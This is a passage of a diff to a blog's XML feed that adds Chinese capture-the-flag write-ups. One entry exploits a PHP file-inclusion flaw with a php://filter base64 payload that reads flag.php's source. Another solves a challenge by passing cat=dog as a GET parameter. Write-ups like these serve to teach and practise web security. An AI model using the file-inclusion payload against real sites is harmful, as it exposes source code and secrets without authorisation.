+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170041509.png" alt="image-20211205170041509"></p>
+<p>但看到php文件，可以联想文件包含漏洞，然后我们可以用php://filter协议来查看源文件内容。</p>
+<p>构造：php://filter/read=convert.base64-encode/recource=flag.php</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170421228.png" alt="image-20211205170421228"></p>
+<p>这句话的意思是我们用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容</p>
+<p><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170455351.png" alt="image-20211205170455351"></p>
+<p>然后经过base64解码就可以看到flag<br><img src="/2021/12/05/php-filter-%E5%8D%8F%E8%AE%AE/image-20211205170507361.png" alt="image-20211205170507361"></p>
 ]]></content>
       <tags>
-        <tag>GET</tag>
+        <tag>php Filter</tag>
       </tags>
   </entry>
   <entry>
@@ -787,6 +867,22 @@
 ]]></content>
       <tags>
         <tag>C++</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>极客大挑战 2019Havefun</title>
+    <url>/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/</url>
+    <content><![CDATA[<p>打开题目后啥也没有，按F12查看代码，发现线索</p>
+<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161615155.png" alt="image-20211205161615155"></p>
+<span id="more"></span>
+
+<p>很明显要用GET的方式让cat=dog</p>
+<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161708933.png" alt="image-20211205161708933"></p>
+<p>进入后得到flag</p>
+<p><img src="/2021/12/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019Havefun/image-20211205161730917.png" alt="image-20211205161730917"></p>
+]]></content>
+      <tags>
+        <tag>GET</tag>
       </tags>
   </entry>
   <entry>
